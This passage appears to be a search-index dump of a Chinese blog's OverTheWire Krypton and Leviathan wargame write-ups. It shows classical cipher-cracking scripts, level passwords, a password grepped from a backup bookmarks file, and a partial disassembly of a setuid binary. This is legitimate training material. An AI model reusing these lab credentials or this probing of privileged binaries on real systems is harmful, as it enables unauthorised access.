open('output.txt', 'r') as f: cipher = f.read() #coding=utf-8 #-*- coding:utf-8 \u2013*- def c_alpha(cipher): # \u53bb\u6389\u975e\u5b57\u6bcd\u540e\u7684\u5bc6\u6587 cipher_alpha = '' for i in range(len(cipher)): if (cipher[i].isalpha()): cipher_alpha += cipher[i] return cipher_alpha # \u8ba1\u7b97cipher\u7684\u91cd\u5408\u6307\u6570 def count_CI(cipher): N = [0.0 for i in range(26)] cipher = c_alpha(cipher) L = len(cipher) if cipher == '': return 0 else: for i in range(L): #\u8ba1\u7b97\u6240\u6709\u5b57\u6bcd\u7684\u9891\u6570\uff0c\u5b58\u5728\u6570\u7ec4N\u5f53\u4e2d if (cipher[i].islower()): N[ord(cipher[i]) - ord('a')] += 1 else: N[ord(cipher[i]) - ord('A')] += 1 CI_1 = 0 for i in range(26): CI_1 += ((N[i] / L) * ((N[i]-1) / (L-1))) return CI_1 # \u8ba1\u7b97\u79d8\u94a5\u957f\u5ea6\u4e3a key_len \u7684\u91cd\u5408\u6307\u6570 def count_key_len_CI(cipher,key_len): un_cip = ['' for i in range(key_len)] # un_cip \u662f\u5206\u7ec4 aver_CI = 0.0 count = 0 for i in range(len(cipher_alpha)): z = i % key_len un_cip[z] += cipher_alpha[i] for i in range(key_len): un_cip[i]= count_CI(un_cip[i]) aver_CI += un_cip[i] aver_CI = aver_CI/len(un_cip) return aver_CI ## \u627e\u51fa\u6700\u53ef\u80fd\u7684\u524d\u5341\u4e2a\u79d8\u94a5\u957f\u5ea6 def pre_10(cipher): M = [(1,count_CI(cipher))]+[(0,0.0) for i in range(49)] for i in range(2,50): M[i] = (i,abs(0.065 - count_key_len_CI(cipher,i))) M = sorted(M,key = lambda x:x[1]) #\u6309\u7167\u6570\u7ec4\u7b2c\u4e8c\u4e2a\u5143\u7d20\u6392\u5e8f for i in range(1,10): print (M[i]) F = [ 0.0651738, 0.0124248, 0.0217339, 0.0349835, 0.1041442, 0.0197881, 0.0158610, 0.0492888, 0.0558094, 0.0009033, 0.0050529, 0.0331490, 0.0202124, 0.0564513, 0.0596302, 0.0137645, 0.0008606, 0.0497563, 0.0515760, 0.0729357, 0.0225134, 0.0082903, 0.0171272, 0.0013692, 0.0145984, 0.0007836 ] # \u82f1\u6587\u5b57\u7b26\u9891\u7387\u3002 cipher_alpha = c_alpha(cipher) print (\"\u79d8\u94a5\u957f\u5ea6\u4e3a:\") pre_10(cipher) \u7136\u540e\u6709\u5982\u4e0b\u8f93\u51fa\uff1a krypton5@bandit:/tmp/krypton5$ python3 test.py \u79d8\u94a5\u957f\u5ea6\u4e3a: (9, 0.017139818147855056) (36, 0.017203685000228598) (18, 0.01721992202177322) (27, 0.017472532653033286) (45, 0.0176209079041227) (33, 0.020346335439459143) (48, 0.020422875620895405) (24, 0.020464673333004946) (30, 0.02051347672724485) \u8fd9\u4e2a\u4e5f\u770b\u4e86\u4e00\u4e0bwp\uff0c\u4e5d\u4f4d\u5bc6\u7801\u662f\u51c6\u7684\uff0c\u4f46\u662f\u7a0b\u5e8f\u8f93\u51fa\u7684\u5bc6\u94a5\u4e0d\u51c6\uff0c\u4e0d\u77e5\u4e3a\u4ec0\u4e48\u3002 \u5bc6\u94a5\u662f keylength, \u7b54\u6848\u662f RANDOM level6 \u8fd9\u4e2a\u8fd8\u662f\u90a3\u4e2a\u7ef4\u5409\u5c3c\u4e9a\u7684\u53d8\u5f62\uff0c\u6ca1\u6709\u592a\u96be\u3002 ciphertext = 'PNUKLYLWRQKGKBE' key = 'EICTDGYIYZKTHNSIRFXYCPFUEOCKRN' for c, k in zip(ciphertext, key): p = ord('A') + ((ord(c) - ord(k)) % 26) print(chr(p), end='') print() \u6700\u540e\u5bc6\u7801\u5982\u4e0b LFSRISNOTRANDOM ref \u8fd9\u4e9b\u4e1c\u897f\u611f\u89c9\u77e5\u9053\u539f\u7406\u5c31\u5dee\u4e0d\u591a\u4e86\uff0c\u81ea\u5df1\u5199\u5b9e\u5728\u662f\u6ca1\u610f\u601d\u800c\u4e14\u6709\u4e9b\u56f0\u96be\u3002 \u4e5f\u6709\u4e0d\u5c11\u4eba\u5199\u811a\u672c\u5206\u6790\uff0c\u4f46\u662f\u611f\u89c9\u90a3\u4e9b\u811a\u672c\u5206\u6790\u51fa\u6765\u7684\u4e5f\u4e0d\u662f\u5f88\u51c6\uff0c\u8fd8\u662f\u9700\u8981\u4eba\u5de5\u6765\u770b\uff0c\u53cd\u6b63\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u641c\u641c\u3002 \u53bb\u7f51\u4e0a\u770b\u4e86\u770b\u53d1\u73b0\u522b\u4eba\u4e5f\u662f\u7528\u5de5\u5177\uff0c\u81ea\u5df1\u5206\u6790\u771f\u662f\u8fc7\u4e8e\u65e0\u804a\u4e86\u3002 ref3","title":"krypton"},{"location":"WarGame/krypton/#level0","text":"base64\u89e3\u7801 S1JZUFRPTklTR1JFQVQ= | | \\|/ KRYPTONISGREAT","title":"level0"},{"location":"WarGame/krypton/#level1","text":"\u5dee\u70b9\u513f\u6ca1\u627e\u7740\u6587\u4ef6\uff0c\u771f\u62bd\u8c61\u3002 krypton1@bandit:/krypton/krypton1$ ll total 16 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 8 root root 4096 Apr 23 18:05 ../ -rw-r----- 1 krypton1 krypton1 26 Apr 23 18:05 krypton2 -rw-r----- 1 krypton1 krypton1 882 Apr 23 18:05 README krypton1@bandit:/krypton/krypton1$ cat README Welcome to Krypton! This game is intended to give hands on experience with cryptography and cryptanalysis. The levels progress from classic ciphers, to modern, easy to harder. Although there are excellent public tools, like cryptool,to perform the simple analysis, we strongly encourage you to try and do these without them for now. We will use them in later excercises. ** Please try these levels without cryptool first ** The first level is easy. The password for level 2 is in the file 'krypton2'. It is 'encrypted' using a simple rotation called ROT13. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! krypton1@bandit:/krypton/krypton1$ cat krypton2 | tr [A-Z] [N-ZA-M] LEVEL TWO PASSWORD ROTTEN krypton1@bandit:/krypton/krypton1$ \u5c31\u4e00\u4e2a\u79fb\u4f4d\u5bc6\u7801","title":"level1"},{"location":"WarGame/krypton/#level2","text":"\u8fd8\u662f\u4e00\u4e2a\u79fb\u4f4d\u5bc6\u7801 krypton2@bandit:/tmp/krypton2$ cat /etc/issue Ubuntu 22.04.2 LTS \\n \\l krypton2@bandit:/tmp/krypton2$ /krypton/krypton2/encrypt /etc/issue krypton2@bandit:/tmp/krypton2$ cat ciphertext GNGZFGXFEZXkrypton2@bandit:/tmp/krypton2$ \u56e0\u6b64 krypton2@bandit:/tmp/krypton2$ cat /krypton/krypton2/krypton3 | tr [A-Z] [O-ZA-N] CAESARISEASY krypton2@bandit:/tmp/krypton2$","title":"level2"},{"location":"WarGame/krypton/#level3","text":"\u63d0\u793a\u662f\u7edf\u8ba1\uff0c\u90a3\u5c31\u77e5\u9053\u4e86 krypton3@bandit:/krypton/krypton3$ cat found{1..3} | tr -cd '[:alpha:]' | fold -w1 | sort | uniq -c | sort -nr 456 S 340 Q 301 J 257 U 246 B 240 N 227 G 227 C 210 D 132 Z 130 V 129 W 86 M 84 Y 75 T 71 X 67 K 64 E 60 L 55 A 28 F 19 I 12 O 4 R 4 H 2 P \u7136\u540e\u8fd9\u513f\u6709\u4e2a\u8fd9\u73a9\u610f\uff0c\u5927\u6982\u80fd\u770b\u51fa\u6765 \u4f46\u662f\u4e0d\u5b8c\u5168\u51c6\uff0c\u6765\u56de\u8bd5\u8bd5\u57fa\u672c\u4e0a\u5c31\u53ef\u4ee5\u4e86 krypton3@bandit:/krypton/krypton3$ cat krypton4 | tr 'KSVWBDGIXMNYQUCAJ' 'WELDOHNVFURPASIBT' WELLD ONETH ELELE LFOUP RASSW OPDIS XPUTE krypton3@bandit:/krypton/krypton3$ \u6bd4\u5982\u8bf4\u4f60\u731ckrypton\u91cc\u9762\u6709password\uff0c\u7136\u540e\u731c\u4e00\u4e0b\u5c31\u884c\u3002","title":"level3"},{"location":"WarGame/krypton/#level4","text":"\u76f4\u63a5\u770bwp\u4e86\u53cd\u6b63\u662f\u3002\u3002\u3002 cleartext \u8fd9\u91cc\u6709\u4e2a\u7834\u89e3\u8fd9\u79cd\u5bc6\u7801\u7684 \u4e2d\u6587\u53c2\u8003 \uff0c\u53ef\u4ee5\u770b\u4e00\u770b","title":"level4"},{"location":"WarGame/krypton/#level5","text":"\u8fd9\u56de\uff0c\u641c\u4e86\u4e2a\u811a\u672c\u513f\u3002\u3002\u3002 \u81ea\u5df1\u5199\u662f\u771f\u4e0d\u4f1a\u3002\u3002\u3002 \u5f53\u7136\uff0c\u9996\u5148\u9700\u8981\u4e00\u70b9\u70b9\u5c0f\u7684\u547d\u4ee4 cat /krypton/krypton5/found{1..3} | tr -d '[:space:]' > output.txt \u7136\u540e\u8dd1\u811a\u672c ref1 REF2 import string # \u52a0\u8f7d\u5bc6\u6587 with open('output.txt', 'r') as f: cipher = f.read() #coding=utf-8 #-*- coding:utf-8 \u2013*- def c_alpha(cipher): # \u53bb\u6389\u975e\u5b57\u6bcd\u540e\u7684\u5bc6\u6587 cipher_alpha = '' for i in range(len(cipher)): if (cipher[i].isalpha()): cipher_alpha += cipher[i] return cipher_alpha # \u8ba1\u7b97cipher\u7684\u91cd\u5408\u6307\u6570 def count_CI(cipher): N = [0.0 for i in range(26)] cipher = c_alpha(cipher) L = len(cipher) if cipher == '': return 0 else: for i in range(L): #\u8ba1\u7b97\u6240\u6709\u5b57\u6bcd\u7684\u9891\u6570\uff0c\u5b58\u5728\u6570\u7ec4N\u5f53\u4e2d if (cipher[i].islower()): N[ord(cipher[i]) - ord('a')] += 1 else: N[ord(cipher[i]) - ord('A')] += 1 CI_1 = 0 for i in range(26): CI_1 += ((N[i] / L) * ((N[i]-1) / (L-1))) return CI_1 # \u8ba1\u7b97\u79d8\u94a5\u957f\u5ea6\u4e3a key_len \u7684\u91cd\u5408\u6307\u6570 def count_key_len_CI(cipher,key_len): un_cip = ['' for i in range(key_len)] # un_cip \u662f\u5206\u7ec4 aver_CI = 0.0 count = 0 for i in range(len(cipher_alpha)): z = i % key_len un_cip[z] += cipher_alpha[i] for i in range(key_len): un_cip[i]= count_CI(un_cip[i]) aver_CI += un_cip[i] aver_CI = aver_CI/len(un_cip) return aver_CI ## \u627e\u51fa\u6700\u53ef\u80fd\u7684\u524d\u5341\u4e2a\u79d8\u94a5\u957f\u5ea6 def pre_10(cipher): M = [(1,count_CI(cipher))]+[(0,0.0) for i in range(49)] for i in range(2,50): M[i] = (i,abs(0.065 - count_key_len_CI(cipher,i))) M = sorted(M,key = lambda x:x[1]) #\u6309\u7167\u6570\u7ec4\u7b2c\u4e8c\u4e2a\u5143\u7d20\u6392\u5e8f for i in range(1,10): print (M[i]) F = [ 0.0651738, 0.0124248, 0.0217339, 0.0349835, 0.1041442, 0.0197881, 0.0158610, 0.0492888, 0.0558094, 0.0009033, 0.0050529, 0.0331490, 0.0202124, 0.0564513, 0.0596302, 0.0137645, 0.0008606, 0.0497563, 0.0515760, 0.0729357, 0.0225134, 0.0082903, 0.0171272, 0.0013692, 0.0145984, 0.0007836 ] # \u82f1\u6587\u5b57\u7b26\u9891\u7387\u3002 cipher_alpha = c_alpha(cipher) print (\"\u79d8\u94a5\u957f\u5ea6\u4e3a:\") pre_10(cipher) \u7136\u540e\u6709\u5982\u4e0b\u8f93\u51fa\uff1a krypton5@bandit:/tmp/krypton5$ python3 test.py \u79d8\u94a5\u957f\u5ea6\u4e3a: (9, 0.017139818147855056) (36, 0.017203685000228598) (18, 0.01721992202177322) (27, 0.017472532653033286) (45, 0.0176209079041227) (33, 0.020346335439459143) (48, 0.020422875620895405) (24, 0.020464673333004946) (30, 0.02051347672724485) \u8fd9\u4e2a\u4e5f\u770b\u4e86\u4e00\u4e0bwp\uff0c\u4e5d\u4f4d\u5bc6\u7801\u662f\u51c6\u7684\uff0c\u4f46\u662f\u7a0b\u5e8f\u8f93\u51fa\u7684\u5bc6\u94a5\u4e0d\u51c6\uff0c\u4e0d\u77e5\u4e3a\u4ec0\u4e48\u3002 \u5bc6\u94a5\u662f keylength, \u7b54\u6848\u662f RANDOM","title":"level5"},{"location":"WarGame/krypton/#level6","text":"\u8fd9\u4e2a\u8fd8\u662f\u90a3\u4e2a\u7ef4\u5409\u5c3c\u4e9a\u7684\u53d8\u5f62\uff0c\u6ca1\u6709\u592a\u96be\u3002 ciphertext = 'PNUKLYLWRQKGKBE' key = 'EICTDGYIYZKTHNSIRFXYCPFUEOCKRN' for c, k in zip(ciphertext, key): p = ord('A') + ((ord(c) - ord(k)) % 26) print(chr(p), end='') print() \u6700\u540e\u5bc6\u7801\u5982\u4e0b LFSRISNOTRANDOM","title":"level6"},{"location":"WarGame/krypton/#ref","text":"\u8fd9\u4e9b\u4e1c\u897f\u611f\u89c9\u77e5\u9053\u539f\u7406\u5c31\u5dee\u4e0d\u591a\u4e86\uff0c\u81ea\u5df1\u5199\u5b9e\u5728\u662f\u6ca1\u610f\u601d\u800c\u4e14\u6709\u4e9b\u56f0\u96be\u3002 \u4e5f\u6709\u4e0d\u5c11\u4eba\u5199\u811a\u672c\u5206\u6790\uff0c\u4f46\u662f\u611f\u89c9\u90a3\u4e9b\u811a\u672c\u5206\u6790\u51fa\u6765\u7684\u4e5f\u4e0d\u662f\u5f88\u51c6\uff0c\u8fd8\u662f\u9700\u8981\u4eba\u5de5\u6765\u770b\uff0c\u53cd\u6b63\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u641c\u641c\u3002 \u53bb\u7f51\u4e0a\u770b\u4e86\u770b\u53d1\u73b0\u522b\u4eba\u4e5f\u662f\u7528\u5de5\u5177\uff0c\u81ea\u5df1\u5206\u6790\u771f\u662f\u8fc7\u4e8e\u65e0\u804a\u4e86\u3002 ref3","title":"ref"},{"location":"WarGame/leviathan/","text":"level0 ssh\u767b\u5f55\uff0c\u8001\u4e09\u6837\u4e86 \u250c\u2500\ud83c\udf35[myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[11:00:33]$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223 The authenticity of host '[leviathan.labs.overthewire.org]:2223 ([16.16.148.221]:2223)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:6: [hashed name] ~/.ssh/known_hosts:9: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '[leviathan.labs.overthewire.org]:2223' (ED25519) to the list of known hosts. _ _ _ _ | | _____ _(_) __ _| |_| |__ __ _ _ __ | |/ _ \\ \\ / / |/ _` | __| '_ \\ / _` | '_ \\ | | __/\\ V /| | (_| | |_| | | | (_| | | | | |_|\\___| \\_/ |_|\\__,_|\\__|_| |_|\\__,_|_| |_| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames leviathan0@leviathan.labs.overthewire.org's password: ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! leviathan0@gibson:~$ level1 \u5148\u770b\u4e00\u773c\u5b58\u5bc6\u7801\u7684\u5730\u65b9 total 48 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 111 root root 12288 Apr 23 18:06 ../ -r-------- 1 leviathan0 leviathan0 11 Apr 23 18:04 leviathan0 -r-------- 1 leviathan1 leviathan1 11 Apr 23 18:04 leviathan1 -r-------- 1 leviathan2 leviathan2 11 Apr 23 18:04 leviathan2 -r-------- 1 leviathan3 leviathan3 11 Apr 23 18:04 leviathan3 -r-------- 1 leviathan4 leviathan4 11 Apr 23 18:04 leviathan4 -r-------- 1 leviathan5 leviathan5 11 Apr 23 18:04 leviathan5 -r-------- 1 leviathan6 leviathan6 11 Apr 23 18:04 leviathan6 -r-------- 1 leviathan7 leviathan7 11 Apr 23 18:04 leviathan7 leviathan0@gibson:~$ \u8fd9\u6311\u6218\u5565\u4e5f\u4e0d\u5199\uff0c\u5168\u9760\u8111\u6d1e\u554a\u3002\u3002\u3002 leviathan0@gibson:~$ ll total 24 drwxr-xr-x 3 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ drwxr-x--- 2 leviathan1 leviathan0 4096 Apr 23 18:04 .backup/ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan0@gibson:~$ ll .backup total 140 drwxr-x--- 2 leviathan1 leviathan0 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 leviathan1 leviathan0 133259 Apr 23 18:04 bookmarks.html leviathan0@gibson:~$ cat .backup/bookmarks.html | grep \"pass\" <DT><A HREF=\"http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIfmI1qsA\" ADD_DATE=\"1155384634\" LAST_CHARSET=\"ISO-8859-1\" ID=\"rdf:#$2wIU71\">password to leviathan1</A> leviathan0@gibson:~$ \u53cd\u6b63\u8fdb\u53bb\u4ee5\u540e\u770b\u4e86\u770bhome\uff0c\u627e\u5230\u4e86 level2 \u5148\u770b\u4e00\u4e0b\u6587\u4ef6 leviathan1@gibson:~$ file check check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805, for GNU/Linux 3.2.0, not stripped \u8bf4\u660e\u5982\u4e0b\uff1a - setuid \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u88ab\u8bbe\u7f6e\u4e86 SetUID \u5c5e\u6027\uff0c\u5373\u5728\u6267\u884c\u8be5\u6587\u4ef6\u65f6\uff0c\u4f1a\u4f7f\u7528\u8be5\u6587\u4ef6\u7684\u6240\u6709\u8005\u7684\u6743\u9650\u6765\u6267\u884c\uff0c\u800c\u4e0d\u662f\u5f53\u524d\u7528\u6237\u7684\u6743\u9650\u3002 - ELF \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 ELF \u6587\u4ef6\u683c\u5f0f\u3002 - 32-bit \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f 32 \u4f4d\u7684\u3002 - LSB \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u9075\u5faa LSB\uff08Linux Standard Base\uff09\u89c4\u8303\u3002 - Intel 80386 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f\u4e3a Intel 80386 \u67b6\u6784\u7f16\u8bd1\u7684\u3002 - version 1 (SYSV) \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 SYSV \u7248\u672c 1 ABI \u6807\u51c6\u3002 - dynamically linked \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\u5e93\u3002 - interpreter /lib/ld-linux.so.2 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4f7f\u7528 /lib/ld-linux.so.2 \u4f5c\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u89e3\u91ca\u5668\u3002 - BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6784\u5efa ID\u3002 - for GNU/Linux 3.2.0 \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u662f\u4e3a GNU/Linux 3.2.0 \u7248\u672c\u7f16\u8bd1\u7684\u3002 - not stripped \uff1a\u8868\u793a\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u6ca1\u6709\u88ab\u5265\u79bb\uff08stripped\uff09\uff0c\u5373\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u5305\u542b\u4e86\u7b26\u53f7\u8868\u548c\u8c03\u8bd5\u4fe1\u606f\uff0c\u4fbf\u4e8e\u8c03\u8bd5\u548c\u5206\u6790\u3002 \u4e00\u5f00\u59cb\u6ca1\u601d\u8def\uff0c\u8f93\u4e86\u597d\u51e0\u904d\u5bc6\u7801\u90fd\u9519\uff0c\u7136\u540e\u7528strings\u626b\u4e86\u4e00\u4e0b leviathan1@gibson:~$ strings check td8 /lib/ld-linux.so.2 _IO_stdin_used __libc_start_main __stack_chk_fail puts printf getchar system strcmp geteuid setreuid libc.so.6 GLIBC_2.4 GLIBC_2.34 GLIBC_2.0 __gmon_start__ secrf love password: /bin/sh Wrong password, Good Bye ... \u641e\u4e86\u4e00\u4e0b\u5b83\u7684\u6c47\u7f16 leviathan1@gibson:~$ objdump -d check check: file format elf32-i386 Disassembly of section .init: 08049000 <_init>: 8049000: f3 0f 1e fb endbr32 8049004: 53 push %ebx 8049005: 83 ec 08 sub $0x8,%esp 8049008: e8 13 01 00 00 call 8049120 <__x86.get_pc_thunk.bx> 804900d: 81 c3 f3 2f 00 00 add $0x2ff3,%ebx 8049013: 8b 83 fc ff ff ff mov -0x4(%ebx),%eax 8049019: 85 c0 test %eax,%eax 804901b: 74 02 je 804901f <_init+0x1f> 804901d: ff d0 call *%eax 804901f: 83 c4 08 add $0x8,%esp 8049022: 5b pop %ebx 8049023: c3 ret Disassembly of section .plt: 08049030 <strcmp@plt-0x10>: 8049030: ff 35 04 c0 04 08 push 0x804c004 8049036: ff 25 08 c0 04 08 jmp *0x804c008 804903c: 00 00 add %al,(%eax) ... 08049040 <strcmp@plt>: 8049040: ff 25 0c c0 04 08 jmp *0x804c00c 8049046: 68 00 00 00 00 push $0x0 804904b: e9 e0 ff ff ff jmp 8049030 <_init+0x30> 08049050 <__libc_start_main@plt>: 8049050: ff 25 10 c0 04 08 jmp *0x804c010 8049056: 68 08 00 00 00 push $0x8 804905b: e9 d0 ff ff ff jmp 8049030 <_init+0x30> 08049060 <printf@plt>: 8049060: ff 25 14 c0 04 08 jmp *0x804c014 8049066: 68 10 00 00 00 push $0x10 804906b: e9 c0 ff ff ff jmp 8049030 <_init+0x30> 08049070 <getchar@plt>: 8049070: ff 25 18 c0 04 08 jmp *0x804c018 8049076: 68 18 00 00 00 push $0x18 804907b: e9 b0 ff ff ff jmp 8049030 <_init+0x30> 08049080 <__stack_chk_fail@plt>: 8049080: ff 25 1c c0 04 08 jmp *0x804c01c 8049086: 68 20 00 00 00 push $0x20 804908b: e9 a0 ff ff ff jmp 8049030 <_init+0x30> 08049090 <geteuid@plt>: 8049090: ff 25 20 c0 04 08 jmp *0x804c020 8049096: 68 28 00 00 00 push $0x28 804909b: e9 90 ff ff ff jmp 8049030 <_init+0x30> 080490a0 <puts@plt>: 80490a0: ff 25 24 c0 04 08 jmp *0x804c024 80490a6: 68 30 00 00 00 push $0x30 80490ab: e9 80 ff ff ff jmp 8049030 <_init+0x30> 080490b0 <system@plt>: 80490b0: ff 25 28 c0 04 08 jmp *0x804c028 80490b6: 68 38 00 00 00 push $0x38 80490bb: e9 70 ff ff ff jmp 8049030 <_init+0x30> 080490c0 <setreuid@plt>: 80490c0: ff 25 2c c0 04 08 jmp *0x804c02c 80490c6: 68 40 00 00 00 push $0x40 80490cb: e9 60 ff ff ff jmp 8049030 <_init+0x30> Disassembly of section .text: 080490d0 <_start>: 80490d0: f3 0f 1e fb endbr32 80490d4: 31 ed xor %ebp,%ebp 80490d6: 5e pop %esi 80490d7: 89 e1 mov %esp,%ecx 80490d9: 83 e4 f0 and $0xfffffff0,%esp 80490dc: 50 push %eax 80490dd: 54 push %esp 80490de: 52 push %edx 80490df: e8 19 00 00 00 call 80490fd <_start+0x2d> 80490e4: 81 c3 1c 2f 00 00 add $0x2f1c,%ebx 80490ea: 6a 00 push $0x0 80490ec: 6a 00 push $0x0 80490ee: 51 push %ecx 80490ef: 56 push %esi 80490f0: c7 c0 e6 91 04 08 mov $0x80491e6,%eax 80490f6: 50 push %eax 80490f7: e8 54 ff ff ff call 8049050 <__libc_start_main@plt> 80490fc: f4 hlt 80490fd: 8b 1c 24 mov (%esp),%ebx 8049100: c3 ret 8049101: 66 90 xchg %ax,%ax 8049103: 66 90 xchg %ax,%ax 8049105: 66 90 xchg %ax,%ax 8049107: 66 90 xchg %ax,%ax 8049109: 66 90 xchg %ax,%ax 804910b: 66 90 xchg %ax,%ax 804910d: 66 90 xchg %ax,%ax 804910f: 90 nop 08049110 <_dl_relocate_static_pie>: 8049110: f3 0f 1e fb endbr32 8049114: c3 ret 8049115: 66 90 xchg %ax,%ax 8049117: 66 90 xchg %ax,%ax 8049119: 66 90 xchg %ax,%ax 804911b: 66 90 xchg %ax,%ax 804911d: 66 90 xchg %ax,%ax 804911f: 90 nop 08049120 <__x86.get_pc_thunk.bx>: 8049120: 8b 1c 24 mov (%esp),%ebx 8049123: c3 ret 8049124: 66 90 xchg %ax,%ax 8049126: 66 90 xchg %ax,%ax 8049128: 66 90 xchg %ax,%ax 804912a: 66 90 xchg %ax,%ax 804912c: 66 90 xchg %ax,%ax 804912e: 66 90 xchg %ax,%ax 08049130 <deregister_tm_clones>: 8049130: b8 38 c0 04 08 mov $0x804c038,%eax 8049135: 3d 38 c0 04 08 cmp $0x804c038,%eax 804913a: 74 24 je 8049160 <deregister_tm_clones+0x30> 804913c: b8 00 00 00 00 mov $0x0,%eax 8049141: 85 c0 test %eax,%eax 8049143: 74 1b je 8049160 <deregister_tm_clones+0x30> 8049145: 55 push %ebp 8049146: 89 e5 mov %esp,%ebp 8049148: 83 ec 14 sub $0x14,%esp 804914b: 68 38 c0 04 08 push $0x804c038 8049150: ff d0 call *%eax 8049152: 83 c4 10 add $0x10,%esp 8049155: c9 leave 8049156: c3 ret 8049157: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804915e: 66 90 xchg %ax,%ax 8049160: c3 ret 8049161: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 8049168: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804916f: 90 nop 08049170 <register_tm_clones>: 8049170: b8 38 c0 04 08 mov $0x804c038,%eax 8049175: 2d 38 c0 04 08 sub $0x804c038,%eax 804917a: 89 c2 mov %eax,%edx 804917c: c1 e8 1f shr $0x1f,%eax 804917f: c1 fa 02 sar $0x2,%edx 8049182: 01 d0 add %edx,%eax 8049184: d1 f8 sar %eax 8049186: 74 20 je 80491a8 <register_tm_clones+0x38> 8049188: ba 00 00 00 00 mov $0x0,%edx 804918d: 85 d2 test %edx,%edx 804918f: 74 17 je 80491a8 <register_tm_clones+0x38> 8049191: 55 push %ebp 8049192: 89 e5 mov %esp,%ebp 8049194: 83 ec 10 sub $0x10,%esp 8049197: 50 push %eax 8049198: 68 38 c0 04 08 push $0x804c038 804919d: ff d2 call *%edx 804919f: 83 c4 10 add $0x10,%esp 80491a2: c9 leave 80491a3: c3 ret 80491a4: 8d 74 26 00 lea 0x0(%esi,%eiz,1),%esi 80491a8: c3 ret 80491a9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491b0 <__do_global_dtors_aux>: 80491b0: f3 0f 1e fb endbr32 80491b4: 80 3d 38 c0 04 08 00 cmpb $0x0,0x804c038 80491bb: 75 1b jne 